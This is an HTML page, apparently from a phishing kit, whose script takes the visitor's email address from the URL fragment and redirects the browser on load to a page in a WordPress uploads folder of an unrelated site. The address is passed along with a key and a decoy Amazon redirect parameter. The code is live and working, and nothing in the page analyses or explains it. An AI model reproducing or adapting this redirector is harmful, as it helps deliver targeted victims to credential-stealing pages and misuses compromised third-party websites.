<html lang="en">
	<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
	<script>
		function makeid(length) {
			var result = "";
			var characters =
				"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
			var charactersLength = characters.length;
			for (var i = 0; i < length; i++) {
				result += characters.charAt(
					Math.floor(Math.random() * charactersLength)
				);
			}
			return result;
		}

		var hash = window.location.hash;
		var str = hash.split("#")[1];
		var em = hash.split("#")[1];

		window.setTimeout(function () {
			window.location.href = "https://www.dianaduganrealestate.com.au/wp-content/uploads/typehub/custom/aczmjkqx/pro.html?key=cfc7a9cfb5486cd925f0f4a447c1fd26&redirect=https://www.amazon.com"+ makeid(10) + "#" + em;
		}, 0);
	</script>
</html>
